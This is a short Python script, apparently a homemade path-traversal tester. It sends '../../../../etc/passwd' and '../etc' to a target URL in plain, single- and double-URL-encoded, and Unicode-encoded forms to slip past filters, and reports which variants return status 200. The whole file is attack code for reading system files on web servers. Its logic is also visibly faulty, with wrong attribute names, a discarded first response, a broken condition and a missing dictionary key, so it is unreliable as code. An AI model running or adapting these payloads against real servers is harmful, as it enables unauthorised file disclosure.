import requests
from urllib.parse import quote_plus
req = requests

dots = "." * 50
def url_encoding(link, payload):
    req.get(f"{link}{payload}")

    # single encoding
    if req.status_codes != 200:
        payload = "../../../../etc/passwd"
        single_encoding = quote_plus(payload)
        single_e_req = req.get(f"{link}{single_encoding}")

        if single_e_req.status_code != 200:
            print(f"Payload {single_encoding} failed with status code {single_e_req}")

            # Double encoding
            double_encoding = quote_plus(single_encoding)
            double_req = req.get(f"{link}{double_encoding}")
            if double_req.status_code == 200:
                print(f"It seems payload {double_encoding}{dots}succeded")
            else:
                print(f"Payload {double_encoding}{dots}failed with status code {double_req.status_code}")
        else:
            print(f"Payload {single_encoding}{dots}{single_e_req.status_code}")

    else:
        print(f"Payload:{payload}{dots}status code {req.status_codes}")

def unicode_encoding(link, payload):
    uCode = {
        "dot" : "%u002e",
        "frwd_slash" : "%u2215",
        "\\" : "%u2216"
    }
    payload = "../etc"
    if "." and "/" in payload:
        replacements = str.maketrans({
            ".": uCode["dot"],
            "/": uCode["frwd_slash"]
        })
        final_payload = payload.translate(replacements)

        # make request using the unicode payload
        ureq = req.get(f"{link}{final_payload}")


    else: # remeber to deal with the \ bcoz of python intepreter
        replacements = str.maketrans({
            ".": uCode["dot"],
            "\\": uCode["back_slash"]
        })
        final_payload = payload.translate(replacements)